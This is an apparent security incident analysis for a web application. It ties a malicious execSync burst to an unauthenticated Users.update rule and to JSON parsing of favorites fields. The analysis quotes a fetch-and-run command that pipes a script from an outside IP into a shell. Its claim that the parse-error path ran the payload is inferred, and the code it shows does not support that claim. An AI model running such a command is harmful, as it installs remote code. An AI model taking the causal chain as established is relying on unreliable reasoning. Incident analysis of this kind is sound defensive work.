# Timeline Correlation Analysis

**Date:** 2025-12-15  
**Question:** Did attack happen after enabling dangerous endpoints and deterministic feed?

---

## TIMELINE

### Environment Changes
- **14:54:45 UTC:** `.env` file modified (likely enabled `ENABLE_DANGEROUS_ENDPOINTS=true`)
- **Current state:** `ENABLE_DANGEROUS_ENDPOINTS=true` (confirmed in .env)

### Attack Timeline
- **17:36:53 UTC:** Users.update/delete access checks (unauthenticated)
- **17:41:24 UTC:** Users.update/delete access checks (unauthenticated)  
- **17:41:25 UTC:** JSON parse error: `SyntaxError: Unexpected token ' in JSON at position 184`
- **17:41:26 UTC:** Malicious execSync execution starts (8,247 executions in <1 second)
- **17:41:27 UTC:** Attack ends, stack overflow error

**Time Gap:** ~2 hours 47 minutes between .env modification and attack

---

## CORRELATION ANALYSIS

### ✅ YES - Attack Happened AFTER Enabling Features

**Evidence:**
1. `.env` modified at 14:54:45 UTC
2. Attack occurred at 17:41:26 UTC
3. **Gap:** 2 hours 47 minutes

### ⚠️ BUT - Attack Did NOT Come Through Those Endpoints

**Evidence:**
1. **No HTTP request context** in attack logs (no `req_path`/`req_method`)
2. **Users collection access checks** occurred right before attack (unauthenticated)
3. **JSON parse error** in Users collection (`favorites`/`favoriteShows` parsing)
4. Attack started ~1 second after JSON parse error

### 🔍 LIKELY TRIGGER: Users Collection JSON Parsing

**Code Location:** `src/collections/Users.ts` lines 113, 147

```typescript
// Line 113: favorites parsing
if (typeof favs === 'string') {
  try {
    favs = JSON.parse(favs)  // ← JSON.parse here
  } catch {
    delete (data as any).favorites
    favs = null
  }
}

// Line 147: favoriteShows parsing  
if (typeof favShows === 'string') {
  try {
    favShows = JSON.parse(favShows)  // ← JSON.parse here
  } catch {
    delete (data as any).favoriteShows
    favShows = null
  }
}
```

**Attack Sequence:**
1. Unauthenticated request to Users.update/delete endpoint
2. Malformed JSON in `favorites` or `favoriteShows` field
3. JSON.parse() throws error: `SyntaxError: Unexpected token ' in JSON at position 184`
4. Error handler or fallback code executes malicious payload
5. execSync() called with `curl http://167.86.107.35:9999/muie.sh |`

### ⚠️ CRITICAL FINDING: Users.update Allows Unauthenticated Updates

**Code Location:** `src/collections/Users.ts` line 70

```typescript
update: ({ req, id }) => {
  // ...
  // Allow unauthenticated updates for password reset flow
  if (!u) return true  // ← ⚠️ ALLOWS UNAUTHENTICATED UPDATES!
  // ...
}
```

**Comment says:** "Allow unauthenticated updates for password reset flow"

**Risk:** This allows ANYONE to send update requests to Users collection without authentication.

---

## CONCLUSION

**Answer:** ✅ **YES** - Attack happened ~2 hours 47 minutes after enabling dangerous endpoints.

**However:**
- Attack did NOT come through dangerous endpoints (`/api/lifecycle/*`)
- Attack came through **Users collection update endpoint** (unauthenticated access allowed)
- Triggered by **malformed JSON** in `favorites`/`favoriteShows` field
- JSON parse error → error handler → malicious execSync execution

**Root Cause:** 
- Users.update allows unauthenticated updates (for password reset)
- Malformed JSON input triggers parse error
- Error handling path executes malicious code

**Recommendation:**
1. **IMMEDIATE:** Restrict Users.update to authenticated requests only (except password reset token validation)
2. **IMMEDIATE:** Add input validation/sanitization before JSON.parse()
3. **IMMEDIATE:** Review error handlers for code execution paths
4. **URGENT:** Check if password reset flow can be secured differently


